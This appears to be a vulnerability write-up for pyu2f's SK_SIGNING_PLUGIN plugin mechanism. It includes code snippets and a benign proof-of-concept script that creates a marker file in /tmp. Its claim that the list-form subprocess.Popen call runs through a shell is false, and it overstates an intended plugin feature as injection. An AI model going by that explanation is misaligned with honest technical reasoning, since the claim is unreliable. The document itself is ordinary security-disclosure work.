### Vulnerability List:

- Vulnerability Name: **Command Injection via SK_SIGNING_PLUGIN environment variable**
- Description:
    1. The `pyu2f` library allows users to specify a custom signing plugin by setting the `SK_SIGNING_PLUGIN` environment variable.
    2. When the `Authenticate()` function of `CustomAuthenticator` is called, it retrieves the plugin path from the `SK_SIGNING_PLUGIN` environment variable.
    3. The library then uses `subprocess.Popen` to execute the command specified in the `SK_SIGNING_PLUGIN` environment variable.
    4. If an attacker can control the `SK_SIGNING_PLUGIN` environment variable, they can inject a malicious command that will be executed by `subprocess.Popen` when `Authenticate()` is called.
- Impact:
    - **High**: Successful command injection can lead to arbitrary code execution on the system where the `pyu2f` library is used. An attacker could potentially gain full control of the system, steal sensitive data, or perform other malicious actions.
- Vulnerability Rank: **High**
- Currently Implemented Mitigations:
    - None. The code directly uses the value from the environment variable without any validation or sanitization.
- Missing Mitigations:
    - **Input Validation and Sanitization:** The library should validate and sanitize the value of the `SK_SIGNING_PLUGIN` environment variable to ensure it only contains a safe executable path and arguments.
    - **Principle of Least Privilege:** If a plugin mechanism is necessary, consider using safer alternatives for plugin execution, or restrict the privileges of the plugin process.
    - **Warning Documentation:** Clearly document the security risks associated with using the `SK_SIGNING_PLUGIN` environment variable and recommend best practices for its usage, emphasizing the importance of setting it to trusted executables only.
- Preconditions:
    - The `SK_SIGNING_PLUGIN` environment variable must be used to enable the custom authenticator plugin.
    - An attacker must be able to control or influence the `SK_SIGNING_PLUGIN` environment variable on the system where the `pyu2f` library is running. This could be achieved through various means depending on the environment, such as:
        - Local access to the system.
        - Exploiting other vulnerabilities to modify environment variables.
        - In scenarios where the application using `pyu2f` runs in a shared or less secure environment.
- Source Code Analysis:
    1. **File:** `/code/pyu2f/convenience/customauthenticator.py`
    2. **Class:** `CustomAuthenticator`
    3. **Function:** `Authenticate(self, app_id, challenge_data, print_callback=sys.stderr.write)`
    4. **Vulnerable Code Snippet:**
        ```python
        plugin_cmd = os.environ.get(SK_SIGNING_PLUGIN_ENV_VAR)
        if plugin_cmd is None:
            raise errors.PluginError('{} env var is not set'
                                    .format(SK_SIGNING_PLUGIN_ENV_VAR))
        # ...
        response = self._CallPlugin([plugin_cmd], signing_input)
        ```
    5. **Code Flow:**
        - The `Authenticate` function first retrieves the value of the `SK_SIGNING_PLUGIN_ENV_VAR` environment variable using `os.environ.get()`.
        - It checks if the environment variable is set. If not, it raises a `PluginError`.
        - If the environment variable is set, its value is assigned to `plugin_cmd`.
        - Later in the `Authenticate` function, the `_CallPlugin` method is called with `[plugin_cmd]` as the command to be executed.
        - **File:** `/code/pyu2f/convenience/customauthenticator.py`
        - **Function:** `_CallPlugin(self, cmd, input_json)`
        - **Vulnerable Code Snippet:**
            ```python
            sign_process = subprocess.Popen(cmd,
                                            stdin=subprocess.PIPE,
                                            stdout=subprocess.PIPE)
            ```
        - **Code Flow:**
            - The `_CallPlugin` function receives `cmd` which is directly derived from `plugin_cmd` (the environment variable).
            - `subprocess.Popen(cmd, ...)` is called. If `cmd` contains malicious commands, these will be executed by the shell because `subprocess.Popen` when called with a list will execute the first item as a command.
    6. **Vulnerability:** The code directly uses the string from the environment variable as a command without any sanitization. This allows for command injection if the environment variable is controlled by an attacker.
    7. **Visualization:**
        ```
        Environment Variable SK_SIGNING_PLUGIN (Attacker Controlled) -->  plugin_cmd (String) --> subprocess.Popen([plugin_cmd], ...) --> System Command Execution
        ```

- Security Test Case:
    1. **Setup Malicious Plugin:** Create a simple malicious script (e.g., `malicious_plugin.sh`) that will create a file in the `/tmp` directory to indicate successful execution.
        ```bash
        #!/bin/bash
        touch /tmp/pwned_by_pyu2f
        echo '{"type": "sign_helper_reply", "code": 0, "errorDetail": "", "responseData": {"appIdHash": "test", "challengeHash": "test", "keyHandle": "test", "version": "U2F_V2", "signatureData": "test"}}'
        ```
        Make the script executable: `chmod +x malicious_plugin.sh`
    2. **Set Environment Variable:** Set the `SK_SIGNING_PLUGIN` environment variable to the path of the malicious script.
        ```bash
        export SK_SIGNING_PLUGIN=$(pwd)/malicious_plugin.sh
        ```
    3. **Run Test Application:** Create a simple Python script (`test_pyu2f.py`) that uses `pyu2f` to trigger the `Authenticate` function of `CustomAuthenticator`.
        ```python
        import os
        from pyu2f.convenience import authenticator
        from pyu2f import model

        origin = "http://example.com"
        app_id = "http://example.com"
        challenge_data = [{'key': model.RegisteredKey(b'test_key_handle'), 'challenge': b'test_challenge'}]

        auth_api = authenticator.CreateCompositeAuthenticator(origin)

        try:
            if auth_api.authenticators[0].IsAvailable(): # Check if CustomAuthenticator is considered available (env var set)
                print("Custom Authenticator is available. Proceeding with authentication.")
                response = auth_api.Authenticate(app_id, challenge_data)
                print("Authentication Response:", response)
            else:
                print("Custom Authenticator is not available.")
        except Exception as e:
            print("Error during authentication:", e)

        print("Test completed.")
        ```
    4. **Execute Test Script:** Run the `test_pyu2f.py` script: `python test_pyu2f.py`
    5. **Verify Exploitation:** Check if the file `/tmp/pwned_by_pyu2f` has been created. If the file exists, it confirms that the malicious script was executed due to command injection via the `SK_SIGNING_PLUGIN` environment variable.